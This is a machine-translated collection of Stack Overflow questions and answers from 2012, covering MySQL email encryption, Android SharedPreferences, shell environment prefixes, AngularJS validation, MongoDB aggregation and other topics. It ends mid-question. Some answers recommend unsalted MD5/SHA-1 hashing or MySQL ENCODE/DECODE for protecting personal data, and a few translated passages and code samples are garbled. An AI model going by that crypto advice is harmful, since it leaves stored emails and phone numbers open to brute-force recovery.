如果您想使用 MySQL 搜索部分邮件地址和电话号码，则不能使用加密 - 如果数据以 MySQL 无法读取的方式加密，那么，MySQL 无法读取，因此无法搜索它。

但是，您可以执行以下操作：

*   散列数据并将散列存储在“email_hash”列中
*   加密数据并将其存储在第二列“email_crypt”中

如果要查找带有电子邮件 X 的行，请选择其中 email_hash = hash(X)。如果您想知道某一行的电子邮件地址，请选择 email_crypt 并对其进行解密。

但是，这将允许攻击者测试某个电子邮件是否在您的数据库中（即他们可以暴力破解哈希）。为了防止这种情况，您应该使用 HMAC 方法进行散列并保持密钥机密。

您现在可以想“嘿，我可以跳过哈希并通过加密纯电子邮件地址并查找包含相同加密字符串的行来进行查找”。不，你不能那样做。如果对数据进行加密，则使用与数据一起存储的随机“IV”，以确保如果对相同的数据进行两次加密，则会得到不同的结果。您可以将 IV 设置为一个常量值，但这是使用密码学的非标准方式，可能会导致安全问题，所以不要这样做。此外，请使用适当的链接模式，例如 AES-CBC。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-31T05:40:22.763

1.  **加密**：您需要有对称加密 (AES)。确保使用主加密密钥加密您的加密密钥（称为数据加密密钥）。
2.  **快速查询和检索**：您还需要在表中包含电子邮件和电话号码的单向哈希值。在对表进行搜索之前生成哈希 (SHA-1) 或 (MD5)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-31T05:41:14.433

它更容易在 MySQL 中完成。您可以使用简单的 MySQL 的[ENCODE/DECODE](https://dev.mysql.com/doc/refman/5.5/en/encryption-functions.html#function_encode)函数或高级函数，如`AES_DECRYPT()`或`AES_ENCRYPT()`。

查看所有功能列表在[这里](https://dev.mysql.com/doc/refman/5.5/en/encryption-functions.htm)。

**注意：**无论您使用什么，请确保将盐存储在该行的列中。并在您的应用程序配置文件中存储另一个盐。这将使用动态盐进行加密，您也可以保留部分盐的秘密。攻击者很难找回这些。

# java - 检索 SharedPreferences 在我的 SettingsActivity 中不起作用

> ID：14097829
> 
> 赞同：0
> 
> 时间：2012-12-31T05:32:41.817
> 
> 标签：java, android, sharedpreferences

我在我的主要活动（称为记分板活动）中定义了一些 SharedPreferences。这些值肯定会被检索到，或者正确的默认值正在工作。但是，我现在尝试设置一个`SettingsActivity`屏幕，以便用户可以更改这些值，但它不能正常工作。当新 Activity 打开时，值不会加载到 XML 布局中的字段中。

（如您所知，我对此很陌生，所以请善待）

这是与共享首选项相关的**ScoreboardActivity代码（有效）：**

```
// get the preferences
        prefs = getPreferences(MODE_PRIVATE);

        // Load the values or defaults from the SharedPreferences
        msMainClockStart = prefs.getLong( "Default_Main_Clock", 480000);    // 8 minute default
        useShotClock = prefs.getBoolean( "Use_ShotClock", false );
        msShotClockStart = prefs.getLong( "Default_Shot_Clock", 24000);     // 24 second default
        tvPeriodPrefix = prefs.getString( "Period_Prefix", getResources().getString(R.string.period) );
        valMaxPeriods = prefs.getInt( "Max_Periods", 4);

Here is my code when the menu button is pressed and Settings is clicked on (I think this is wrong but the settings.xml page does open:

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        setContentView(R.layout.settings);

        return super.onOptionsItemSelected(item);
    } 
```

**这是我的设置活动：**

```
 package com.example.ultimatescoreclock;

    import android.app.Activity;
    import android.content.SharedPreferences;
    import android.os.Bundle;
    import android.widget.CheckBox;
    import android.widget.EditText;

    public class SettingsActivity extends Activity {

    ScoreboardActivity scoreboard = new ScoreboardActivity();
    SharedPreferences settings = scoreboard.prefs;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        EditText
            strMainMinutes,
            strShotSeconds,
            strPeriodPrefix,
            strMaxPeriods;

        CheckBox
            cbUseShotClock;

        super.onCreate(savedInstanceState);
        setContentView(R.layout.settings);

        // Load the values or defaults from the SharedPreferences
        scoreboard.msMainClockStart = settings.getLong( "Default_Main_Clock", 480000);  // 8 minute default
        scoreboard.useShotClock = settings.getBoolean( "Use_ShotClock", true );
        scoreboard.msShotClockStart = settings.getLong( "Default_Shot_Clock", 24000);       // 24 second default
        scoreboard.tvPeriodPrefix = settings.getString( "Period_Prefix", getResources().getString(R.string.period) );
        scoreboard.valMaxPeriods = settings.getInt( "Max_Periods", 4);

        strMainMinutes = (EditText) findViewById(R.id.numMainMinutes);
        cbUseShotClock = (CheckBox) findViewById(R.id.cbUseShotClock);
        strShotSeconds = (EditText) findViewById(R.id.numShotSeconds);
        strPeriodPrefix = (EditText) findViewById(R.id.periodPrefix);
        strMaxPeriods = (EditText) findViewById(R.id.periodMax);

        strMainMinutes.setText( Long.toString(scoreboard.msMainClockStart / 1000) );
        cbUseShotClock.setChecked( scoreboard.useShotClock );
        strShotSeconds.setText( Long.toString(scoreboard.msShotClockStart / 1000) );
        strPeriodPrefix.setText( scoreboard.tvPeriodPrefix );
        strMaxPeriods.setText( Integer.toString(scoreboard.valMaxPeriods) );
    }

} 
```

**这是我的 XML 布局：**

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="match_parent"
android:layout_height="match_parent"
android:orientation="vertical" >

<TextView
    android:id="@+id/lblMainClock"
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:text="Main Clock Default (mins)" />

<EditText
    android:id="@+id/numMainMinutes"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_weight="1"
    android:ems="10"
    android:inputType="number"
    android:minEms="4" />

<CheckBox
    android:id="@+id/cbUseShotClock"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:gravity="center_vertical|start"
    android:text="Use Shot Clock" />

<TextView
    android:id="@+id/lblShotClock"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:text="Shot Clock Default (secs)" />

<EditText
    android:id="@+id/numShotSeconds"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:layout_weight="1"
    android:ems="10"
    android:inputType="number"
    android:minEms="4" >

    <requestFocus />
</EditText>

<TextView
    android:id="@+id/lblPeriodPrefix"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:text="Period Prefix (e.g. Q, Shift, etc)" />

<EditText
    android:id="@+id/periodPrefix"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:ems="10" />

<TextView
    android:id="@+id/lblMaxPeriods"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:text="Maximum Number of Periods" />

<EditText
    android:id="@+id/periodMax"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:minEms="4" /> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T06:41:07.857

您应该首先学习android的基础知识。

你实例化`ScoreboardActivity`的方式不是android的实例化方式`Activity`。

在您的代码中，我没有找到任何与将**数据保存**到`SharedPreferences`. 您放在那里的代码仅用于从`SharedPreferences`两个类中检索数据。

当您使用 UI 组件更改值时，例如更改 CheckBox 状态、更改 EditText 中的文本等，您需要在最终确定值时再次将它们保存到 SharedPreferences（要求用户保存或完成当前活动）。

我建议你阅读一些 android-sdk 的基础知识。

*   [以下](https://stackoverflow.com/a/3624358/593709)是有关保存和检索数据的一些示例和说明`SharedPreferences`
*   [这](http://developer.android.com/training/basics/firstapp/starting-activity.html)是一个关于如何开始的android教程`Activity`。（活动之间切换）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T22:24:17.767

@Eric & @Adil Soomro - 感谢您的评论。你让我走上了正确的轨道，我发现了如何在我的 SettingsActivity 中完成对 SharedPreferences 的检索。

这是我为将来可能感兴趣的任何人更改的代码...

检索初始值的主要活动代码：

```
 // get the preferences
    prefs = getPreferences(MODE_PRIVATE);

    // Load the values or defaults from the SharedPreferences
    msMainClockStart = prefs.getLong( "Default_Main_Clock", DEFAULT_MAIN_CLOCK_START);
    useShotClock = prefs.getBoolean( "Use_ShotClock", DEFAULT_USE_SHOT_CLOCK );
    msShotClockStart = prefs.getLong( "Default_Shot_Clock", DEFAULT_SHOT_CLOCK_START);
    tvPeriodPrefix = prefs.getString( "Period_Prefix", DEFAULT_PERIOD_PREFIX );
    valMaxPeriods = prefs.getInt( "Max_Periods", DEFAULT_PERIOD_MAX ); 
```

onOptionsItemSelected 方法：

```
@Override
public boolean onOptionsItemSelected(MenuItem item) {
    Intent intent = new Intent(this, SettingsActivity.class);       
    startActivity(intent);

    return super.onOptionsItemSelected(item);
} 
```

SettingsActivity 类：

```
package com.example.ultimatescoreclock;

import android.app.Activity;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.widget.CheckBox;
import android.widget.EditText;

public class SettingsActivity extends Activity {

EditText
    strMainMinutes,
    strShotSeconds,
    strPeriodPrefix,
    strMaxPeriods;

long
    msMainClockStart,
    msShotClockStart;

int valMaxPeriods;

CheckBox cbUseShotClock;

SharedPreferences prefs;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.settings);

    // get the Shared Preferences
    prefs  = getPreferences(MODE_PRIVATE);

    // assign the views
    strMainMinutes = (EditText) findViewById(R.id.numMainMinutes);
    cbUseShotClock = (CheckBox) findViewById(R.id.cbUseShotClock);
    strShotSeconds = (EditText) findViewById(R.id.numShotSeconds);
    strPeriodPrefix = (EditText) findViewById(R.id.periodPrefix);
    strMaxPeriods = (EditText) findViewById(R.id.periodMax);

    // Load the values or defaults from the SharedPreferences
    msMainClockStart = prefs.getLong( "Default_Main_Clock", DEFAULT_MAIN_CLOCK_START);
    cbUseShotClock.setChecked( prefs.getBoolean( "Use_ShotClock", DEFAULT_USE_SHOT_CLOCK) );
    msShotClockStart = prefs.getLong( "Default_Shot_Clock", DEFAULT_SHOT_CLOCK_START);
    strPeriodPrefix.setText( prefs.getString("Period_Prefix", DEFAULT_PERIOD_PREFIX) );
    valMaxPeriods = prefs.getInt( "Max_Periods", DEFAULT_PERIOD_MAX );

    // convert the values that need converting
    strMainMinutes.setText( Long.toString(msMainClockStart / 60000) );
    strShotSeconds.setText( Long.toString(msShotClockStart / 1000) );
    strMaxPeriods.setText( Integer.toString(valMaxPeriods) );

}

} 
```

# git - git-stash 中的 shell 脚本是什么意思，它是如何工作的？

> ID：14097834
> 
> 赞同：1
> 
> 时间：2012-12-31T05:32:53.870
> 
> 标签：git, bash, shell, sh, git-stash

我在中看到了这样的代码片段`git-stash`

```
 rm -f "$TMP-index" &&
            GIT_INDEX_FILE="$TMP-index" git read-tree HEAD &&

            # find out what the user wants
            GIT_INDEX_FILE="$TMP-index" \
                    git add--interactive --patch=stash -- &&

            # state of the working tree
            w_tree=$(GIT_INDEX_FILE="$TMP-index" git write-tree) ||
            die "$(gettext "Cannot save the current worktree state")"

            git diff-tree -p HEAD $w_tree -- >"$TMP-patch" &&
            test -s "$TMP-patch" ||
            die "$(gettext "No changes selected")"

            rm -f "$TMP-index" ||
            die "$(gettext "Cannot remove temporary index (can't happen)")" 
```

我不明白的是这样的表达：

```
GIT_INDEX_FILE="$TMP-index" git read-tree HEAD 
```

这是否意味着分配`TMP-index`to的值`GIT_INDEX_FILE`，然后执行 command `git read-tree HEAD`？

对此我不确定。所以我试着写一个类似的命令。

```
A="1" ls
echo $A 
```

的值`A`仍然是`null`。

我也试过这个：

```
echo $a
=> 1
k=$(a=100 echo $a)
=> 
echo $k
=> 1 
```

看起来 的值`a`根本没有改变。所以`a=100`看起来没用..

有没有人对这样的语法有想法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T05:45:18.460

您的问题“这是否意味着......”的答案是**yes**。

但是，在解析命令时会发生变量扩展，这样就无法看到设置环境变量然后将其导入 shell 的结果，这就是为什么您没有得到预期结果的原因。

有多种方法可以查看单行环境变量表达式的结果；你可以观察...

```
$ B=100 env | grep B
B=100 
```

...或者...

```
$ z=abc sh -c 'echo $z'
abc 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-31T05:51:56.460

在 BASH 中，定义变量和之后运行新进程存在一些问题。

如果您只是定义变量，它不会被新进程“继承”

让我们定义一个变量

```
$ VAR='value'
$ echo $VAR
value 
```

然后进入新的流程

```
$ bash 
```

变量未定义

```
$ echo $VAR

$ 
```

但是一旦我们回来

```
$ exit 
```

var 再次定义

```
$ echo $VAR
value
$ 
```

解决这个问题的通常方法是使用导出

```
$ export VAR2='yep'
$ bash
$ echo $VAR2
yep
$ 
```

您所看到的（似乎是）另一种语法，它在子进程中分配变量，而不是在原始进程中

```
$ var3='wow' bash  #this line opens a new bash, and assigns the variable for this new bash
$ echo $var3
wow
$ exit
$ echo $var3

$ 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-31T17:32:59.707

> 这是否意味着分配`TMP-index`to的值`GIT_INDEX_FILE`，然后执行 command `git read-tree HEAD`？

不完全的。语法：

```
VAR1=val1 VAR2=val2 somecommand arg1 arg2 
```

告诉 shell 执行`somecommand`带有参数`arg1`和的命令`arg2`，但是`somecommand`的环境将`VAR1`设置为`val1`和。shell 本身不会受到这些分配的影响，只会受到. 效果相当于：`VAR2``val2``somecommand`

```
env VAR1=val1 VAR2=val2 somecommand arg1 arg2 
```

唯一的区别是前一种方法不需要查找和执行`/usr/bin/env`实用程序（我假设`env`它不是 shell 内置实用程序），因此它的速度更快。

它也相当于：

```
(export VAR1=val1 VAR2=val2; somecommand arg1 arg2) 
```

注意括号——这会导致 shell 在单独的子 shell 中执行命令。当子shell 结束时，对子shell 的任何更改（例如变量分配）都不会保留。

## 例子

```
#!/bin/sh
FOO=value1
printf %s\\n "In the shell, FOO is ${FOO} (before running python)"
FOO=value2 python -c 'import os; print "In python, FOO is", os.environ["FOO"]'
printf %s\\n "In the shell, FOO is ${FOO} (after running python)" 
```

上面的脚本打印以下输出：

```
In the shell FOO is value1 (before running python)
In python, FOO is value2
In the shell, FOO is value1 (after running python) 
```

## Git 在做什么

在您提供的 Git shell 代码片段中，`git stash`暂时更改`GIT_INDEX_FILE`了一些调用，`git`以便`stash`可以执行一些索引变异操作而不会弄乱您的索引：

*   首先，`git stash`用于`git read-tree`创建临时索引文件并将其内容初始化为`HEAD`.
*   其次，`git stash`用于`git add --interactive`询问用户要存储哪些部分并将选择的更改保存在临时索引文件中。
*   第三，`git stash`用于`git write-tree`将临时索引的内容保存为 Git 存储库中的树对象。
*   第四，`git stash`比较树对象以`HEAD`确保您确实选择了要存储的东西。
*   最后，`git stash`删除它创建的临时索引文件。

# android - 处理程序和线程 ui 更新

> ID：14097835
> 
> 赞同：0
> 
> 时间：2012-12-31T05:33:01.303
> 
> 标签：android, callback

我在一个活动中创建了一个处理程序（让我们说“ **FirstActivity** ”）并将这个**处理程序传递给一个线程**。现在我想`handleMessage()`通过调用`handler.obtainMessage(100).sendToTarget()`from 线程来更新 ui 内部。线程将消息传递到 UI 需要 20 到 30 秒的时间。

`callback(handleMessage())`现在我的问题是：我在“FirstActivity”调用 之前切换到另一个活动（让我们说“SecondActivity”） ：

1.“FirstActivity”是否可用于垃圾收集？
2\. 如果我们完成“FirstActivity”并移动到“SecondActivity”，那么“FirstActivity”上的视图是可用的还是变为空？如果没有变为空，那么为什么因为“FirstActivity”此时已完成，如果我们想要更新视图，那么它应该抛出 NullPointerException。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T05:54:46.467

```
 runOnUiThread(new Runnable() {
        @Override
            public void run() {
                //Your code for UI update goes here.
            }
    }); 
```

它的 simple.above 代码将让您从处理程序更新您的 ui。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T05:55:54.390

如果我们完成第一个活动，它将不再可用。
如果您想再次更新第一个活动，您应该将意图传递给第一个活动。那么你应该更新..那个时候你不会得到空指针异常。您应该为此经历活动生命周期。

# asp.net - 是否可以根据控制器方法中的条件返回 PartialView 或 View？

> ID：14097836
> 
> 赞同：0
> 
> 时间：2012-12-31T05:33:19.540
> 
> 标签：asp.net, asp.net-mvc-3

即使我的方法期望返回 PartialView，有没有办法重定向到页面？

```
 public PartialViewResult PlacementConfirmed(int placementID)
    {

        if (placementID == 5)
        {
            // Redirect to ambiance View
            // ???

        }

        return PartialView("_PlacementConfirmed");
    } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-31T05:42:27.020

您可以只返回一个“ActionResult”，PartialViewResult 继承自 ViewResultBase，而 ViewResultBase 继承自 ActionResult。

所以你可以做这样的事情：

```
public ActionResult PlacementConfirmed(int placementID)
{

    if (placementID == 5)
        return View("View");

    return PartialView("_PlacementConfirmed");
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-31T05:41:48.927

如果这是在您的项目的控制器中，您可以执行以下操作：

```
 public PartialViewResult PlacementConfirmed(int placementID)
       {

          if (placementID == 5)
          {
            return RedirectToAction("redirectView");
          }

          return PartialView("_PlacementConfirmed");

       } 
```

# fpdf - PDFTable Unicode 支持

> ID：14097841
> 
> 赞同：0
> 
> 时间：2012-12-31T05:34:24.770
> 
> 标签：fpdf

我正在使用来自[http://www.vanxuan.net/tool/pdftable/](http://www.vanxuan.net/tool/pdftable/)的 PDFTable，它基于 FPDF 类。我设法使用 PDFTable 将 HTML 表格导出为 pdf。但是，我面临一个问题。非英文字符全部显示为乱码。它似乎不支持unicode。我要显示的语言是阿拉伯语和俄语。

从理论上讲，我可以创建一个类似于 PDFTable 的类，它继承自 FPDF，并从头开始开发它以添加 unicode 支持。但这是很多工作。有没有人做过类似的事情，也许可以分享？谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T05:48:00.117

对于 unicode 支持，最好的方法是使用来自[http://www.fpdf.org/en/script/script92.php](http://www.fpdf.org/en/script/script92.php)的 tFPDF 。它是 FPDF 的一个分支，专门支持 unicode。该课程基于最新的 FPDF 版本 1.7。

# ruby - 使用 Ruby 处理 selenium Webdriver 中选择标记的选项时文件错误结束

> ID：14097846
> 
> 赞同：0
> 
> 时间：2012-12-31T05:35:08.663
> 
> 标签：ruby, webdriver, selenium-webdriver

以下是我用来从选择标签中选择一个特定选项的代码：

```
 select = driver.find_element(:id, "lang")
       wait = Selenium::WebDriver::Wait.new(:timeout => 20)
       begin
         all_options = wait.until { driver.find_elements(:tag_name => "option") }
       end
       all_options.each do |option|
             if (option.attribute("value")=="11")
                 option.click
             end
       end 
```

我正在使用 jruby。当我在 IRB 中逐行执行命令时，没有问题。但是，当我一起运行整个代码时，它给了我一个意外的文件结束错误。为什么我会收到此错误？为什么它在逐个命令执行时起作用，而不是在整体执行时起作用？我该如何克服呢？

错误如下 -

```
SyntaxError: (irb):364: syntax error, unexpected end-of-file

from org/jruby/RubyKernel.java:1061:in `eval'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:158:in `eval_input'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:271:in `signal_status'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:270:in `signal_status'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:155:in `eval_input'
from org/jruby/RubyKernel.java:1392:in `loop'
from org/jruby/RubyKernel.java:1160:in `catch'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:154:in `eval_input'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:71:in `start'
from org/jruby/RubyKernel.java:1160:in `catch'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:70:in `start'
from C:\jruby-1.7.1\/bin/jirb_swing:54:in `(root)'
SyntaxError: (irb):364: syntax error, unexpected kEND

end
^
from org/jruby/RubyKernel.java:1061:in `eval'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:158:in `eval_input'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:271:in `signal_status'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:270:in `signal_status'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:155:in `eval_input'
from org/jruby/RubyKernel.java:1392:in `loop'
from org/jruby/RubyKernel.java:1160:in `catch'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:154:in `eval_input'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:71:in `start'
from org/jruby/RubyKernel.java:1160:in `catch'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:70:in `start'
from C:\jruby-1.7.1\/bin/jirb_swing:54:in `(root)'
SyntaxError: (irb):367: syntax error, unexpected end-of-file

from org/jruby/RubyKernel.java:1061:in `eval'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:158:in `eval_input'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:271:in `signal_status'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:270:in `signal_status'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:155:in `eval_input'
from org/jruby/RubyKernel.java:1392:in `loop'
from org/jruby/RubyKernel.java:1160:in `catch'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:154:in `eval_input'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:71:in `start'
from org/jruby/RubyKernel.java:1160:in `catch'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:70:in `start'
from C:\jruby-1.7.1\/bin/jirb_swing:54:in `(root)'
NameError: undefined local variable or method `option' for main:Object
from (irb):367:in `evaluate'
from org/jruby/RubyKernel.java:1061:in `eval'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:158:in `eval_input'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:271:in `signal_status'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:270:in `signal_status'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:155:in `eval_input'
from org/jruby/RubyKernel.java:1392:in `loop'
from org/jruby/RubyKernel.java:1160:in `catch'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:154:in `eval_input'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:71:in `start'
from org/jruby/RubyKernel.java:1160:in `catch'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:70:in `start'
from C:\jruby-1.7.1\/bin/jirb_swing:54:in `(root)'
SyntaxError: (irb):368: syntax error, unexpected kEND

end
    ^
from org/jruby/RubyKernel.java:1061:in `eval'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:158:in `eval_input'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:271:in `signal_status'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:270:in `signal_status'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:155:in `eval_input'
from org/jruby/RubyKernel.java:1392:in `loop'
from org/jruby/RubyKernel.java:1160:in `catch'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:154:in `eval_input'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:71:in `start'
from org/jruby/RubyKernel.java:1160:in `catch'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:70:in `start'
from C:\jruby-1.7.1\/bin/jirb_swing:54:in `(root)'
SyntaxError: (irb):369: syntax error, unexpected kEND

 end
 ^
from org/jruby/RubyKernel.java:1061:in `eval'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:158:in `eval_input'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:271:in `signal_status'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:270:in `signal_status'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:155:in `eval_input'
from org/jruby/RubyKernel.java:1392:in `loop'
from org/jruby/RubyKernel.java:1160:in `catch'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:154:in `eval_input'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:71:in `start'
from org/jruby/RubyKernel.java:1160:in `catch'
from C:/jruby-1.7.1/lib/ruby/1.8/irb.rb:70:in `start'
from C:\jruby-1.7.1\/bin/jirb_swing:54:in `(root)' 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-31T08:09:38.720

你有太多的目的：

```
 begin <--- remove this
     all_options = wait.until { driver.find_elements(:tag_name => "option") }
   end <--- remove this
   all_options.each do |option|
         if (option.attribute("value")=="11")
             option.click
         end
   end 
```

或者，如果您需要救援：

```
 begin
     all_options = wait.until { driver.find_elements(:tag_name => "option") }
  rescue
     do someting
  end 
   all_options.each do |option|
         if (option.attribute("value")=="11")
             option.click
         end
   end 
```

# macos - /usr/lib/libwrap.7.dylib 安装 mac osx 10.8 后出错

> ID：14097848
> 
> 赞同：2
> 
> 时间：2012-12-31T05:35:45.107
> 
> 标签：macos, git, ssh

升级到 MAC OSX 10.8.2 后，我在使用 git 时遇到问题。Trace 显示缺少一个 lib 文件：

```
git push
dyld: Library not loaded: /usr/lib/libwrap.7.dylib
Referenced from: /usr/local/bin/ssh
Reason: image not found 
```

这会导致 SSH 失败，然后是 GIT，因为 git 使用 SSH。谷歌周围看到了大量类似的问题，但似乎没有提供一个可行的解决方案。

有什么建议吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T17:08:30.813

To fix this, unlink then reinstall your app. e.g. if you use Homebrew:

```
brew unlink git
brew install git --build-from-source 
```

(Edit: I also ran `brew install libtool --universal` before the above. That may have also done it.)

# javascript - 如何使用引导程序和角度形式逐步验证表单？

> ID：14097851
> 
> 赞同：0
> 
> 时间：2012-12-31T05:36:10.593
> 
> 标签：javascript, node.js, twitter-bootstrap, angularjs

我找到了这个[带有 bootstrap 和 angularjs 的示例分步表单](http://jsfiddle.net/bgrimes/58wqH/)

在跳转到第 2 步之前如何验证电子邮件？或阻止步骤跳转，直到字段已满？？

```
function RegisterCtrl($scope, $location) {

  $scope.steps = [
    'Step 1: Team Info',
    'Step 2: Campaign Info',
    'Step 3: Campaign Media'
  ];

....some code 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-31T15:35:02.117

您应该使用[指令](http://docs.angularjs.org/guide/directive)来测试您的表单字段的有效性，例如：

```
app.directive('email', function() {
    return {
        require: 'ngModel',
        link: function(scope, elm, attrs, ctrl) {
            ctrl.$parsers.unshift(function(viewValue) {
                if (viewValue && viewValue.match(/[a-z0-9\-_]+@[a-z0-9\-_]+\.[a-z0-9\-_]{2,}/)) {
                    // it is valid
                    ctrl.$setValidity('email', true);
                    return viewValue;
                } else {
                    // it is invalid, return undefined (no model update)
                    ctrl.$setValidity('email', false);
                    return undefined;
                }
            });
        }
    };
}); 
```

在您的 html 中，您需要将指令添加到您的输入字段。如果使用对象的字段无效，您可以显示错误消息`myForm.email.$error`：

```
<input type="text" name="email" id="inputEmail" placeholder="Email" ng-model="email" email required>
<span ng-show="myForm.email.$error.email" class="help-inline">Email invalid</span>
<span ng-show="myForm.email.$error.required" class="help-inline">Email required</span> 
```

您可以通过在[ng-class](http://docs.angularjs.org/api/ng.directive%3angClass)上使用[myForm.$invalid](http://docs.angularjs.org/guide/forms)来禁用下一个链接，直到表单有效：

```
<li ng-class="{disabled: myForm.$invalid}" >
   <a ng-model="next" ng-click="incrementStep(myForm)">Next Step &rarr;</a>
</li> 
```

见[例子](http://jsfiddle.net/asgoth/YXKMU/)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-31T11:31:51.480

首先，在控制器中定义模型：

```
function RegisterCtrl($scope, $location) {
    $scope.step1 = {
        name: '',
        email: '',
        password: '',
        passwordc: ''
     };
    //... 
```

将其绑定到您的表单字段：

```
<input type="text" id="inputEmail" ng-model="step1.email" placeholder="Email"> 
```

接下来，在 gotoStep() 中进行验证：

```
 $scope.goToStep = function(index) {
        if (!$scope.step1.email.match(/[a-z0-9\-_]+@[a-z0-9\-_]+\.[a-z0-9\-_]{2,}/)) {
              return window.alert('Please specify a valid email');
        }
        //... 
```

显然 alert 不是很好，所以使用 jQuery`focus()`并添加 Bootstrap 类 ( `control-group warning`) 以突出显示该字段。

[http://jsfiddle.net/xayzP/](http://jsfiddle.net/xayzP/)

# node.js - mongo访问量最大

> ID：14097853
> 
> 赞同：1
> 
> 时间：2012-12-31T05:36:25.423
> 
> 标签：node.js, mongodb, database-design, database, nosql

如何使用 mongodb 获取每天/每周/每月访问量最大的页面/条目

此解决方案适用于统计数据，但不适用于最常访问条目列表 [MongoDB 存储大量指标/分析数据的方法](https://stackoverflow.com/questions/5712698/mongodb-approaches-for-storing-large-amounts-of-metrics-analytics-data)

map/reduce 太慢了……还是不行？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-31T08:27:33.180

根据您提到的示例，创建了一个集合，其中 url 命中按小时显示。

假设示例文档是这样的

```
{page: "/index.html", time: Date( "Mon Apr 18 07:49:28 2011"), views: 53, tweets: 2} 
```

您可以使用 Mongodb 的聚合框架。以下是每月汇总视图的 sudo 代码。

```
 db.pagestats.aggregate( { $project : { month_hits : { $month : "$time" } } },    
    { $group:{_id : {$month_hits:"$month_hits"},hits: { $sum: "$views" } } }, 
    { $sort : { "_id.hits" : 1 }} } ); 
```

有关聚合的更多详细信息，请参阅此[链接](http://docs.mongodb.org/manual/tutorial/aggregation-examples)。

Map-Reduce 不适用于实时查询。因此，您可以进行类似的聚合并将结果保存在临时集合中并用于实时查询。您可以执行增量 MapReduce，这样您就无需再次为整个集合运行 MapReduce。阅读[此处](http://docs.mongodb.org/manual/applications/map-reduce/#incremental-map-reduce)了解更多详情。

对于这种情况，我会选择增量 MapReduce。

# java - 如何在 Java 中旋转 BufferedImage？

> ID：14097856
> 
> 赞同：0
> 
> 时间：2012-12-31T05:36:37.343
> 
> 标签：java, image, rotation, bufferedimage, affinetransform

> **可能重复：**
> [旋转 BufferedImage 实例](https://stackoverflow.com/questions/4918482/rotating-bufferedimage-instances)

我目前使用的方法（如下）导致 BufferedImage 变得越来越失真，角度参数越小。

```
public static BufferedImage getRotatedImage(BufferedImage src, int angle) { 

    if (src == null) {

      System.out.println("getRotatedImage: input image is null");
